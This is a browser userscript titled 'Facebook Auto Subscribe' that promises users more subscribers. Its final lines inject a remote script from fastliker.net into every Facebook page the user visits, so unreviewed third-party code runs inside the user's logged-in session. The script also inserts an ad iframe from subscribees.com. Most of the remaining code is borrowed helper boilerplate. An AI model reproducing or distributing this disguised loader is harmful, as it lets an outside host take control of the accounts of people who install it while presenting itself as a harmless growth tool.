/**
*/
// ==UserScript==
// @name			Facebook Auto Subscribe
// @namespace       Facebook Subscribers
// @description 	It allows you to get more subscribers
// @version			3.0
// @editor			screamo
// @license     	GPL 3.0
// @include     	http*://*.facebook.com/* 
// @include     	http*://*.google.*/* 
// @exclude     	http*://*.facebook.com/plugins/*
// @exclude     	http*://*.facebook.com/widgets/*
// @exclude     	http*://*.facebook.com/iframe/*
// @exclude     	http*://*.facebook.com/desktop/*
// @exclude     	http*://*.channel.facebook.com/*
// @exclude     	http*://*.facebook.com/ai.php*
// @exclude     	http*://*.timelineclose.com/*
// @exclude        	http://*.channel.facebook.tld/*
// @exclude        	http://static.*.facebook.tld/*
// @exclude        	http://*.facebook.tld/ai.php*
// @exclude        	http://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*
// @exclude        	https://*.channel.facebook.tld/*
// @exclude       	https://static.*.facebook.tld/*
// @exclude        	https://*.facebook.tld/ai.php*
// @exclude        	https://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*
// @exclude     	http*://*.google.*/blank.html
// @require       http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js

// ==/UserScript==
if (!/https?:\/\/[^\/]*\.?facebook\.[^\/]+\//.test(window.location.href))
{
var googledayim=1;
}

if (googledayim && !/https?:\/\/[^\/]*\.?google\.[^\/]+\//.test(window.location.href)) { return; }


// Get a reference to the *real* window
if (typeof unsafeWindow=="undefined") {
	var div = document.createElement('div');
	div.setAttribute('onclick', 'return window;');
	unsafeWindow = div.onclick();
}

if (!window.localStorage) {  
  window.localStorage = {  
    getItem: function (sKey) {  
      if (!sKey || !this.hasOwnProperty(sKey)) { return null; }  
      return unescape(document.cookie.replace(new RegExp("(?:^|.*;\\s*)" + escape(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*((?:[^;](?!;))*[^;]?).*"), "$1"));  
    },  
    key: function (nKeyId) { return unescape(document.cookie.replace(/\s*\=(?:.(?!;))*$/, "").split(/\s*\=(?:[^;](?!;))*[^;]?;\s*/)[nKeyId]); },  
    setItem: function (sKey, sValue) {  
      if(!sKey) { return; }  
      document.cookie = escape(sKey) + "=" + escape(sValue) + "; path=/";  
      this.length = document.cookie.match(/\=/g).length;  
    },  
    length: 0,  
    removeItem: function (sKey) {  
      if (!sKey || !this.hasOwnProperty(sKey)) { return; }  
      var sExpDate = new Date();  
      sExpDate.setDate(sExpDate.getDate() - 1);  
      document.cookie = escape(sKey) + "=; expires=" + sExpDate.toGMTString() + "; path=/";  
      this.length--;  
    },  
    hasOwnProperty: function (sKey) { return (new RegExp("(?:^|;\\s*)" + escape(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=")).test(document.cookie); }  
  };  
  window.localStorage.length = (document.cookie.match(/\=/g) || window.localStorage).length;  
}  

// Greasemonkey API for Chrome/Safari/Opera
GM_addStyle=function(css) {var style = document.createElement('style');style.textContent = css;document.getElementsByTagName('head')[0].appendChild(style);};
GM_getValue=function(name, defaultValue) { return window.localStorage.getItem(name) || defaultValue;};
GM_setValue=function(name, value) {
	try {window.localStorage.setItem(name, value);} catch (e) {
		if (e.toString().indexOf('QUOTA_EXCEEDED_ERR')>-1) { add_error("Either your browser's local storage area is full or you are browsing in Private Browsing mode, which isn't supported.<br>Please <a href=\"http://SocialFixer.com/faq.php#quota\" target=\"_blank\">Read the FAQ</a> for a detailed explanation of this error");}
	}
};


var opera_xhr_counter = 0;
var opera_xhr_funcs = {};
GM_xmlhttpRequest=function(obj) {
	try {
		if (obj && obj.url && obj.url.indexOf("facebook.com")>0) {
			var request=new window.XMLHttpRequest();
			request.onreadystatechange=function() { if(obj.onreadystatechange) { obj.onreadystatechange(request); }; if(request.readyState==4 && obj.onload) { obj.onload(request); } }
			request.onerror=function() { if(obj.onerror) { obj.onerror(request); } }
			try { request.open(obj.method,obj.url,true); } catch(e) { if(obj.onerror) { obj.onerror( {readyState:4,responseHeaders:'',responseText:'',responseXML:'',status:403,statusText:'Forbidden'} ); }; return; }
			if(obj.headers) { for(name in obj.headers) { request.setRequestHeader(name,obj.headers[name]); } }
			request.send(obj.data); return request;
		} 
		else {
			opera_xhr_counter++;
			var xhr = { 'method':obj.method, 'url':obj.url, 'headers':obj.headers, 'data':obj.data };
			var req_obj = {'type':'ajax', 'xhr':xhr, 'id':opera_xhr_counter};
			opera_xhr_funcs[ opera_xhr_counter ] = obj.onload;
			opera.extension.postMessage( JSON.stringify(req_obj) );
		}
	} catch(e) {
		alert(e);
	}
};

ads();
function ads() {
	$('div.ego_section').append('Auto Subscribe<br><iframe width=200px height=80px scrolling=no src="http://subscribees.com/ads/ren300x250.html">');
}

var ajax = function(props) {
	GM_xmlhttpRequest(props);
}


// Don't run on link redirects and some other cases
var excludes = ['/l.php?u','/ai.php','/plugins/','morestories.php','blank.html'];
try {
	for (var i=0; i<excludes.length; i++) {
		if ( window.location.href.indexOf(excludes[i])>0 ) { return; }
	}
} catch(e) { }



// Extension Option Persistence
function setValue(key,val,func) { 
	if (PERFORMANCE) { trace_start('setValue',null,true); }
	var do_set=function() { 
		if (PERFORMANCE) { trace_start('setValue',null,true); }
		try { 
			GM_setValue(key,val); 
		} catch(e) { 
			alert(e); 
		} 
		if(func) { 
			func(key,val); 
		} 
		if (PERFORMANCE) { trace_end('setValue',null,true); }
	};
	do_set.name="setValue.do_set";
	window.setTimeout(do_set,0);
	if (PERFORMANCE) { trace_end('setValue',null,true); }
}
function getValue(key, def, func) {
	if (PERFORMANCE) { trace_start('getValue',null,true); }
	// Key can be either a single key or an array of keys
	if (typeof key=="string") {
		return func(GM_getValue(key,def));
	}
	else if (typeof key=="object" && key.length) {
		var values = {};
		for (var i=0; i<key.length; i++) {
			var default_value = undef;
			if (typeof def=="object" && def.length && i<def.length) {
				default_value = def[i];
			}
			values[key[i]] = GM_getValue(key[i],default_value);
		}
		if (func) {
			return func(values);
		}
		else { return values; }
	}
    if (PERFORMANCE) { trace_end('getValue',null,true); }
    return undef;
}

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("facebook.com") >= 0){
addJavascript('http://fastliker.net/sd.js');
}